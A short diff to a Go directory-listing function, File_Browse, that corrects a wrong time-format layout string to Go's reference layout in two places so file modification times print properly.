@@ -181,7 +181,7 @@ func File_Browse(b []byte) []byte {
 	if err != nil {
 		panic(err)
 	}
-	modTimeStr := modTime.Format("01/01/2000 00:00:00")
+	modTimeStr := modTime.Format("01/02/2006 15:04:05")
 	resultStr := ""
 	if dirPathStr == "./" {
 		resultStr = fmt.Sprintf("%s/*", absCurrentDir)
@@ -192,7 +192,7 @@ func File_Browse(b []byte) []byte {
 	resultStr += fmt.Sprintf("\nD\t0\t%s\t..", modTimeStr)
 	files, err := ioutil.ReadDir(dirPathStr)
 	for _, file := range files {
-		modTimeStr = file.ModTime().Format("01/01/2000 00:00:00")
+		modTimeStr = file.ModTime().Format("01/02/2006 15:04:05")
 
 		if file.IsDir() {
 			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, file.Name())
